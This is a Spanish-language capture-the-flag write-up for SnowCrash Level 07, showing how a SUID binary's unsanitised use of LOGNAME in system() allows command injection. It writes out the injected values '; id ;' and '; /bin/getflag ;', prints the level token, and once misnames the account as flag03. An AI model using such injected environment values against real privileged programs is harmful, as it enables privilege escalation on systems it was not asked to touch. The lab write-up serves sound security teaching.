# SnowCrash - Level 07: Inyección de Comandos vía Variable de Entorno

Este repositorio documenta el proceso de resolución del **Nivel 07**. El reto consiste en identificar cómo un binario con privilegios elevados (`SUID`) interactúa con el entorno del sistema y cómo se puede manipular esa interacción para ejecutar comandos arbitrarios.

## 1. Análisis Inicial

### Reconocimiento de Archivos

Identificamos un binario con permisos de ejecución especiales:

```bash
ls -la
# -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

```

**Observaciones:**

* **Bit SUID activo:** El binario pertenece a `flag07`.
* **Propietario:** Al ejecutarse, el proceso heredará los privilegios de `flag07`.

---

## 2. Ingeniería Inversa

Para entender el flujo del programa, se utilizaron herramientas de trazado y análisis de símbolos.

### A. Trazado de Librerías (`ltrace`)

El comando `ltrace` reveló la lógica interna del binario:

```text
getenv("LOGNAME") = "level07"
asprintf(0xbffff744, 0x8048688, "level07", ...) = 18
system("/bin/echo level07 ")

```

**Interpretación técnica:**

1. **`getenv("LOGNAME")`**: El programa recupera el valor de la variable de entorno `LOGNAME`.
2. **`asprintf`**: Construye una cadena de comando formateada: `/bin/echo %s`.
3. **`system()`**: Ejecuta la cadena construida a través de la shell del sistema.

### B. Análisis de Cadenas (`strings`)

Confirmamos la presencia de las funciones y la cadena de formato:

```text
LOGNAME
/bin/echo %s
system
setresuid

```

---

## 3. Metodología de Explotación: Command Injection

La vulnerabilidad reside en que el binario confía ciegamente en el contenido de `LOGNAME`. Al no existir una sanitización de metacaracteres de shell, podemos inyectar un separador de comandos (`;`) para finalizar el comando `echo` y comenzar uno nuevo.

### Paso 1: Verificación de Privilegios

Primero probamos inyectando el comando `id` para confirmar la escalada:

```bash
export LOGNAME="; id ;"
./level07
# Salida: uid=3007(flag07) gid=2007(level07) ...

```

### Paso 2: Ejecución de pruebas

Una vez confirmada la inyección, probamos con simples textos:

```bash
export LOGNAME="prueba"
./level07
# Salida: prueba

```

### Paso 3: Ejecución del Payload Final

Una vez confirmada la inyección, exportamos la variable para ejecutar el binario de validación:

```bash
export LOGNAME="; /bin/getflag ;"
./level07

```

**Lógica del ataque:**
La shell recibe la siguiente instrucción: `/bin/echo ; /bin/getflag ;`.

1. Ejecuta `/bin/echo` con un argumento vacío.
2. Ejecuta `/bin/getflag` con los privilegios de `flag03` heredados del bit SUID.

---

## 4. Resultado y Resolución

La inyección fue exitosa y el programa devolvió el token de victoria:

* **Token obtenido:** `fiumuikeil55xe9cu4dood66h`

### Pasos finales:

1. Cambiar al usuario objetivo: `su level08`
2. Introducir la contraseña: `fiumuikeil55xe9cu4dood66h`

**Level 07 passed!**

---

## 5. Conclusiones Técnicas

* **Inyección de Entorno:** El uso de `getenv()` seguido de `system()` sin validación es un antipatrón de seguridad grave.
* **Separadores de Comandos:** El uso de `;` permite encadenar procesos en la shell de Linux.
* **Higiene de Variables:** Las variables de entorno son controladas por el usuario y nunca deben considerarse datos de confianza en programas con privilegios elevados.

---